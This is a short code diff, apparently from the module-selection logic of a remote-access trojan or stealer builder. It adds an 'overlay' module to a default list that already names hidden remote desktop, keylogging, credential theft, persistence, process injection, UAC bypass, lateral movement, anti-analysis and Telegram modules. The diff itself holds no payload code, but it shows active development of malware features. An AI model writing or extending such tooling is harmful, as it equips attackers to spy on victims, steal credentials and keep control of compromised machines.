@@ -286,7 +286,7 @@ function resolveModules(opts) {
   const set = new Set(['core']);
   const requested = String(
     opts.modules === undefined || opts.modules === '' || opts.modules === 'all'
-      ? 'esc,uac,runas,hvnc,keylog,creds,persist,exec,inject,pymod,lateral,net,proc,anti,ws,telegram'
+      ? 'esc,uac,runas,hvnc,keylog,creds,persist,exec,inject,pymod,lateral,net,proc,anti,ws,telegram,overlay'
       : opts.modules
   ).split(',').map((m) => m.trim().toLowerCase()).filter(Boolean);
   for (const m of requested) set.add(m);
